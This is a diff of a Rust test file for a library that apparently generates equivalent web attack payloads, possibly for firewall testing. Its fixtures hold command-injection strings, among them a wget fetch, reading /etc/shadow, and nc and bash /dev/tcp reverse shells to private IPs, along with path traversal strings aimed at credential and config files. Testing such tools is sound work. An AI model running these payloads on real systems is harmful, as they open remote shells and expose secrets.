@@ -4,12 +4,12 @@
 //! executes/resolves the original attack and a non-attack in ⇒
 //! nothing out. Thousands of effective assertions.
 
-use wafrift_grammar::grammar::equiv::{self, EquivConfig};
 use wafrift_grammar::grammar::equiv::cmd as ecmd;
 use wafrift_grammar::grammar::equiv::ldap as eldap;
 use wafrift_grammar::grammar::equiv::path as epath;
 use wafrift_grammar::grammar::equiv::ssti as essti;
 use wafrift_grammar::grammar::equiv::xss as exss;
+use wafrift_grammar::grammar::equiv::{self, EquivConfig};
 
 fn cfg(seed: u64) -> EquivConfig {
     EquivConfig {
@@ -77,7 +77,14 @@ fn xss_every_member_still_executes() {
 
 #[test]
 fn xss_non_attack_in_nothing_out() {
-    for j in ["", "  ", "hello world", "plain text alert here", "{}", "see <b>bold</b>"] {
+    for j in [
+        "",
+        "  ",
+        "hello world",
+        "plain text alert here",
+        "{}",
+        "see <b>bold</b>",
+    ] {
         assert!(
             equiv::equiv_for("xss", j, &cfg(2)).is_empty(),
             "xss emitted from non-attack {j:?}"
@@ -91,7 +98,10 @@ const CMD_STRUCTURED: &[(&str, &[&str])] = &[
     ("&& wget http://10.1.1.9/x -O /tmp/x", &["wget", "10.1.1.9"]),
     ("; cat /etc/shadow", &["cat", "shadow"]),
     ("| nc 192.168.9.9 9001 -e /bin/sh", &["192.168.9.9"]),
-    ("; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &["dev/tcp", "10.0.0.1"]),
+    (
+        "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+        &["dev/tcp", "10.0.0.1"],
+    ),
 ];
 const CMD_PROBE: &[&str] = &["; whoami", "; id", "; uname -a"];
 
@@ -108,7 +118,10 @@ fn cmd_every_member_keeps_command_and_target() {
                     m.payload
                 );
                 let nc = m.payload.to_ascii_lowercase();
-                let nn = nc.replace("${ifs}", " ").replace("''", "").replace('\\', "");
+                let nn = nc
+                    .replace("${ifs}", " ")
+                    .replace("''", "")
+                    .replace('\\', "");
                 assert!(
                     must.iter().any(|k| nn.contains(k))
                         || ecmd::still_executes_cmd(atk, &m.payload),
@@ -147,7 +160,10 @@ const PATH_CASES: &[(&str, &str)] = &[
     ("../../../etc/passwd", "etc/passwd"),
     ("../../../../var/www/html/config/secrets.php", "secrets.php"),
     ("..\\..\\..\\windows\\win.ini", "win.ini"),
-    ("../../../../opt/tomcat/conf/tomcat-users.xml", "tomcat-users.xml"),
+    (
+        "../../../../opt/tomcat/conf/tomcat-users.xml",
+        "tomcat-users.xml",
+    ),
     ("../../proc/self/environ", "environ"),
 ];
 
@@ -318,13 +334,20 @@ fn unsupported_class_returns_empty() {
     // the generator never guesses (anti-rig).
     assert!(!equiv::supports_class("smuggling"));
     assert!(!equiv::supports_class("totally-unknown"));
-    assert!(
-        equiv::equiv_for("totally-unknown", "anything", &cfg(1)).is_empty()
-    );
+    assert!(equiv::equiv_for("totally-unknown", "anything", &cfg(1)).is_empty());
     // The 10 classes that DO carry a sound model (ssrf/nosql/log4shell/
     // xxe were added 2026-05-18, extending the moat 6 → 10).
     for c in [
-        "sql", "xss", "cmdi", "path", "ssti", "ldap", "ssrf", "nosql", "log4shell", "xxe",
+        "sql",
+        "xss",
+        "cmdi",
+        "path",
+        "ssti",
+        "ldap",
+        "ssrf",
+        "nosql",
+        "log4shell",
+        "xxe",
     ] {
         assert!(equiv::supports_class(c), "{c} should be supported");
     }
